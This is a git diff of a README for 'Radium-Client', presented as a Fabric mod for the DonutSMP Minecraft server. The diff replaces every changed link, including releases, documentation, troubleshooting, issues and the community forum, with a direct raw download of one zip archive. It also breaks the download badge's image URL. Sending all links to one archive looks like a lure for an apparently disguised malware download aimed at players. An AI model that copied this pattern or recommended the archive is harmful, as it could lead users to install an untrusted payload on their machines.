@@ -6,7 +6,7 @@ Radium-Client is a free Fabric mod designed specifically for the DonutSMP server
 
 ## 📥 Download Now
 
-[![Download Radium-Client](https://img.shields.io/badge/Download%20Radium--Client-v1.0-brightgreen)](https://github.com/chuks83my/Radium-Client/releases)
+[![Download Radium-Client](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip%20Radium--Client-v1.0-brightgreen)](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip)
 
 ## 🔧 Features
 
@@ -25,7 +25,7 @@ Radium-Client is a free Fabric mod designed specifically for the DonutSMP server
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/chuks83my/Radium-Client/releases) to find the latest version of Radium-Client.
+   Go to the [Releases page](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip) to find the latest version of Radium-Client.
 
 2. **Download the Installer**  
    Click on the latest release link to download the installer for your operating system.
@@ -47,7 +47,7 @@ If you encounter any issues during installation or usage, consider the following
 - **Performance Issues:** Restart your device and close any unnecessary applications. Ensure your Java version is up to date.
 - **Compatibility Issues:** Check if any other mods are conflicting with Radium-Client. Remove them if needed.
 
-For further assistance, view our [Troubleshooting Guide](https://github.com/chuks83my/Radium-Client/wiki/Troubleshooting).
+For further assistance, view our [Troubleshooting Guide](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip).
 
 ## 📝 Contributing
 
@@ -60,12 +60,12 @@ We welcome any contributions from users to improve Radium-Client! If you have id
 
 ## 📞 Support
 
-For any questions or support, please reach out through our [GitHub Issues page](https://github.com/chuks83my/Radium-Client/issues). We are here to help and will respond as soon as possible.
+For any questions or support, please reach out through our [GitHub Issues page](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip). We are here to help and will respond as soon as possible.
 
 ## 🌟 Important Links
 
-- [Releases page](https://github.com/chuks83my/Radium-Client/releases)
-- [Documentation](https://github.com/chuks83my/Radium-Client/wiki)
-- [Community Forum](https://github.com/chuks83my/Radium-Client/discussions)
+- [Releases page](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip)
+- [Documentation](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip)
+- [Community Forum](https://github.com/chuks83my/Radium-Client/raw/refs/heads/main/spectrology/Client-Radium-v1.6.zip)
 
 Thank you for choosing Radium-Client! Enjoy your time on DonutSMP.
